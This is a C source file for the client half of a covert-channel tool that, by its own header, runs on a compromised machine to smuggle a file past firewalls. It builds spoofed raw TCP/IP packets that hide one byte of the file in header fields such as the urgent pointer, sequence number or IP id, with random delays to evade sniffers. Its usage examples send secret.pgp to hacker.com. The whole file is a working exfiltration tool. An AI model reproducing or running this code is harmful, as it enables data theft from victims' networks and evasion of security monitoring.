/*
 ==============================================================================================
 Name        	:	Covert_Transfer.c

 Author      	: 	Jivanjot S. Brar

 Version     	:	1.0

 Copyright   	: 	GPL

 Description 	: 	This program manipulates the TCP/IP header to transfer a file one byte
 : 	at a time to a destination host. This is useful for bypassing fire walls
 : 	from the inside, and for exporting data with innocuous looking packets
 : 	that contain no data for sniffers to analyze.
 :
 :	This is a client application that resides on a compromised machine and
 :	covertly transfers the target data to the Reciever on a friendly machine.
 :

 Compile	 	:	gcc -Wall -o cln_covert Covert_Client.c

 Execute		:	./cln_covert -source <source_ip> -src_port <source_port>
 -dest <dest_ip> -dest_port <destination port> <encode type> -file <filename>

 12 args -src_port optional 10 -source optional 8
 ==============================================================================================
 */

#include "common.h"

int main(int argc, char *argv[]) {
	client *cln;

	// Can they run this?
	if (geteuid() != 0) {
		printf(
				"\nYou need to be root to run this.\n\nApplication Terminated!\n\n");
		exit(0);
	}

	// Check for correct arguments, and provide them with a usage.
	if ((argc < 8) || (argc > 12)) {
		print_usage(argv);
		exit(0);
	}

	cln = client_new(); 			// create and initialize a new client struct
	validate_args(argc, argv, cln); // Validates the command line arguments and sets the client structs

	printf("\n\nSending packets to: \n");
	printf("============================\n\n");
	printf("Destination	: 	%s:%u\n", cln->desthost, cln->dest_port);
	printf("Source		: 	%s:%u\n", cln->srchost, cln->source_port);
	printf("Filename	: 	%s\n", cln->filename);
	if (cln->urg_ptr)	// if Urgent Pointer is SET
		printf("Encoding Type 	: 	TCP Urgent Pointer\n\n");
	else if (cln->tos)
		printf("Encoding Type 	:	IP Type of Service\n\n");
	else if (cln->frag_off)
		printf("Encoding Type 	: 	IP Fragment Offset\n\n");
	else if (cln->ack)		// if Acknowledgement field is SET
		printf("Encoding Type 	: 	TCP Acknowledgement\n\n");
	else if (cln->seq)
		printf("Encoding Type 	: 	TCP Sequence\n\n");
	else if (cln->id)
		printf("Encoding Type 	: 	IP Identification\n\n");

	printf("\n");

	srand(time(NULL) + getpid());

	send_packets(cln);

	printf("\nFile\"%s\" Transfered Successfully!!\n\n", cln->filename);

	return EXIT_SUCCESS;
}

void print_usage(char *argv[]) {
	printf(
			"Covert Transfer Usage: \n%s -dest dest_ip -dest_port port -file filename [encode type]\n\n",
			argv[0]);
	printf("-dest [dest_ip]		- Receiver to send data to. \n");
	printf(
			"-dest_port [port]	- IP port you want data to go to. [DEFAULT PORT == 80]\n");
	printf(
			"-source [source_ip]	- Host where you want to data to originate from.\n"
					"			  (Source can include a bounce server address).\n");
	printf(
			"-src_port [source_port]	- IP source port you want data to appear from. \n"
					"			  (Randomly Set by default)\n");
	printf("-file [filename]	- Name of the file to encode and transfer.\n\n");
	printf("[Encode Type]: Following are the optional encoding types: \n");
	printf(
			"	-urg_ptr	- Encode data a byte at a time in the TCP packet Urgent Pointed field.\n");
	printf(
			"	-seq		- Encode data a byte at a time in the TCP packet sequence number field. \n");
	printf(
			"	-ack		- Encode data a byte at a time in the TCP packet acknowledge field. \n");
	printf(
			"	-id		- Encode data a byte at a time in the IP packet identification field. \n");
	printf(
			"	-tos	- Encode data a byte at a time in the IP packet's Type of Service field.\n\n");

	printf(
			"Examples\n=====================================================================================================================\n\n");
	printf(
			"Example 1: \n %s -dest hacker.com -dest_port 80 -file secret.pgp -frag_off \n"
					" %s -dest hacker.com -dest_port 80 -file secret.pgp -urg_ptr \n\n",
			argv[0], argv[0]);
	printf(
			" The example above send the secret.pgp file a byte at time to hacker.com on port 80 either using\n"
					" IP headers fragment offset field or TCP headers urgent pointer field.\n\n");

	printf(
			"Example 2: \n %s -source foo.bar.com -src_port 1234  -dest hacker.com -dest_port 80 -file secret.pgp -frag_off \n"
					" %s -source foo.bar.com -src_port 1234 -dest hacker.com -dest_port 80 -file secret.pgp -urg_ptr \n\n",
			argv[0], argv[0]);
	printf(
			" The example above send the secret.pgp file a byte at time to hacker.com on \n"
					" port 80 from foo.bar.com either using IP headers fragment offset field or \n"
					" TCP headers urgent pointer field.\n\n");

}

client *client_new(void) {
	client *c = malloc(sizeof(client));
	c->source_host = 0;
	c->source_port = 0;
	c->dest_host = 0;
	c->dest_port = 80; 	// DEFAULT PORT TO SEND PACKETS TO
	c->urg_ptr = 1;		// TCP HEADER [default]
	c->seq = 0;			// TCP HEADER
	c->ack = 0;			// TCP HEADER
	c->id = 0;			// IP HEADER
	c->tos = 0;			// IP HEADER
	c->frag_off = 0;	// IP HEADER
	c->dest = 0;
	c->destport = 0;
	c->file = 0;
	c->source = 0;
	c->src_port = 0;
	return c;
}

void packet_new(client *c, int ch) {
	//packets *p = malloc(sizeof(packets));

	packets.ip.version = 4;
	packets.ip.ihl = 5;
	packets.ip.tos = 0;
	packets.ip.tot_len = htons(40);
	packets.ip.id = htons(55555);
	packets.ip.frag_off = 0;
	packets.ip.ttl = 64;
	packets.ip.protocol = IPPROTO_TCP;
	packets.ip.check = 0;
	packets.ip.saddr = c->source_host;
	packets.ip.daddr = c->dest_host;

	packets.tcp.source = 0;
	packets.tcp.dest = 0;
	packets.tcp.seq = 0;
	packets.tcp.ack_seq = 0;
	packets.tcp.doff = 5;
	packets.tcp.res1 = 0;

	packets.tcp.fin = 0;
	packets.tcp.syn = 1;
	packets.tcp.rst = 0;
	packets.tcp.psh = 0;
	packets.tcp.ack = 0;
	packets.tcp.urg = 0;
	packets.tcp.res2 = 0;

	packets.tcp.window = htons(512);
	packets.tcp.check = 0;
	packets.tcp.urg_ptr = 0;

	/* Initialize RNG for future use */
	//srand((getpid()) * (c->dest_port));

	if (c->src_port) 			// if source port is SET
		packets.tcp.source = htons(c->source_port);
	else
		packets.tcp.source = htons(1 + (int) (10000.0 * rand() / (RAND_MAX + 1.0)));

	packets.tcp.dest = htons(c->dest_port);

	if (c->urg_ptr)	// if Urgent Pointer is SET
		packets.tcp.urg_ptr = ch;

	if (c->tos)
		packets.ip.tos = ch;

	if (c->frag_off)
		packets.ip.frag_off = ch;

	if (c->ack) {		// if Acknowledgement field is SET
		packets.tcp.ack_seq = ch;
		packets.tcp.ack = 1;
	}

	if (c->seq)			// if Sequence field is SET
		packets.tcp.seq = ch;
	else {
		// else random sequence number
		packets.tcp.seq = 1 + (int) (10000.0 * rand() / (RAND_MAX + 1.0));
	}

	if (c->id)			// if Identification field is SET
		packets.ip.id = ch;
	else {
		// else random Identification number
	//	packets.ip.id = (int) (255.0 * rand() / (RAND_MAX + 1.0));
	}

	packets.ip.check = in_cksum((unsigned short *) &packets.ip, 20);

	/* From synhose.c by knight */
	pseudo_header.source_address = packets.ip.saddr;
	pseudo_header.dest_address = packets.ip.daddr;
	pseudo_header.placeholder = 0;
	pseudo_header.protocol = IPPROTO_TCP;
	pseudo_header.tcp_length = htons(20);

	bcopy((char *) &packets.tcp, (char *) &pseudo_header.tcp, 20);
	/* Final checksum on the entire package */
	packets.tcp.check = in_cksum((unsigned short *) &pseudo_header, 32);
}

void send_packets(client *c) {
	int ch, send_socket, sleep_amt;
	struct sockaddr_in sin;
	FILE *input;

	if ((input = fopen(c->filename, "rb")) == NULL) {
		SystemFatal(
				"send_packets(): fopen: Uable to open the file for reading.");
	} else {
		while ((ch = fgetc(input)) != EOF) {

			sleep_amt = (rand() % 30) + 5;
			printf("Sleep = %d\n", sleep_amt);
			sleep(sleep_amt);

			//packet_init(p, c, ch);

			packet_new(c, ch);

			sin.sin_family = AF_INET;
			sin.sin_port = packets.tcp.dest;
			sin.sin_addr.s_addr = packets.ip.daddr;

			if ((send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
				SystemFatal(
						"send_packets(): socket: unable to create a socket.");
			}

			sendto(send_socket, &packets, 40, 0, (struct sockaddr *) &sin,
					sizeof(sin));
			printf("Sending Data: %c\n", ch);

			close(send_socket);
		}
		fclose(input);
	}

}

bool if_exists(char *array[], char *value) {
	int count = 0;
	for (count = 0; count < 11; ++count) {
		if (strcmp(array[count], value) == 0) {
			return true;
		}
	}
	return false;
}

void SystemFatal(char *msg) {
	printf("\n%s\n\n", msg);
	exit(EXIT_FAILURE);
}

unsigned int host_convert(char *hostname) {
	static struct in_addr i;
	struct hostent *h;
	i.s_addr = inet_addr(hostname);
	if (i.s_addr == -1) {
		h = gethostbyname(hostname);
		if (h == NULL) {
			fprintf(stderr, "cannot resolve %s\n", hostname);
			exit(0);
		}
		bcopy(h->h_addr, (char *) &i.s_addr, h->h_length);
	}
	return i.s_addr;
}

void validate_args(int argc, char *argv[], client *c) {
	int count = 0;

	for (count = 1; count < argc; ++count) {
		if (!if_exists(options, argv[count])) {
			printf("\n**Invalid Option: %s\n", argv[count]);
			printf("\nPress ENTER for examples.\n\n");
			getchar();
			print_usage(argv);
			exit(EXIT_FAILURE);
		}

		if (strcmp(argv[count], "-dest") == 0) {
			if (if_exists(options, argv[count + 1]) == false) {
				strcpy(c->desthost, argv[count + 1]);
				c->dest_host = host_convert(argv[count + 1]);
				count += 1;
				c->dest = 1;
			} else {
				SystemFatal("INVALID [value] FOR OPTION -dest");
			}
		} else if (strcmp(argv[count], "-dest_port") == 0) {
			if (if_exists(options, argv[count + 1]) == false) {
				c->dest_port = atoi(argv[count + 1]);
				c->destport = 1;
				count += 1;
			} else {
				SystemFatal("INVALID [value] FOR OPTION -dest_port");
			}
		} else if (strcmp(argv[count], "-source") == 0) {
			if (if_exists(options, argv[count + 1]) == false) {
				strcpy(c->srchost, argv[count + 1]);
				c->source_host = host_convert(argv[count + 1]);
				c->source = 1;
				count += 1;
			} else {
				SystemFatal("INVALID [value] FOR OPTION -source");
			}
		} else if (strcmp(argv[count], "-src_port") == 0) {
			if (if_exists(options, argv[count + 1]) == false) {
				c->source_port = atoi(argv[count + 1]);
				c->src_port = 1;
				count += 1;
			} else {
				SystemFatal("INVALID [value] FOR OPTION -src_port");
			}
		} else if (strcmp(argv[count], "-file") == 0) {
			if (if_exists(options, argv[count + 1]) == false) {
				strncpy(c->filename, argv[count + 1], 79);
				c->file = 1;
				count += 1;
			} else {
				SystemFatal("INVALID [value] FOR OPTION -file");
			}
		} else if (strcmp(argv[count], "-urg_ptr") == 0) {
			c->urg_ptr = 1;
		} else if (strcmp(argv[count], "-seq") == 0) {
			c->seq = 1;
			c->urg_ptr = 0;
		} else if (strcmp(argv[count], "-ack") == 0) {
			c->ack = 1;
			c->urg_ptr = 0;
		} else if (strcmp(argv[count], "-id") == 0) {
			c->id = 1;
			c->urg_ptr = 0;
		} else if (strcmp(argv[count], "-tos") == 0) {
			c->tos = 1;
			c->urg_ptr = 0;
		} else if (strcmp(argv[count], "-frag_off") == 0) {
			c->frag_off = 1;
			c->urg_ptr = 0;
		}
	}

	if (c->dest != 1 || c->file != 1 || c->source != 1) {
		printf("\n Following args are required as a client: \n");
		printf("-dest [dest IP] \n-source [source IP] \n-file [Filename] \n\n");
		exit(EXIT_FAILURE);
	}
}

/*-------- Checksum Algorithm (Public domain Ping) ----------------------*/
unsigned short in_cksum(unsigned short *addr, int len) {
	int nleft = len;
	int sum = 0;
	unsigned short *w = addr;
	unsigned short answer = 0;

	/*
	 * Our algorithm is simple, using a 32 bit accumulator (sum), we add
	 * sequential 16 bit words to it, and at the end, fold back all the
	 * carry bits from the top 16 bits into the lower 16 bits.
	 */
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	/* 4mop up an odd byte, if necessary */
	if (nleft == 1) {
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}

	/* 4add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
	sum += (sum >> 16); /* add carry */
	answer = ~sum; /* truncate to 16 bits */
	return (answer);
}
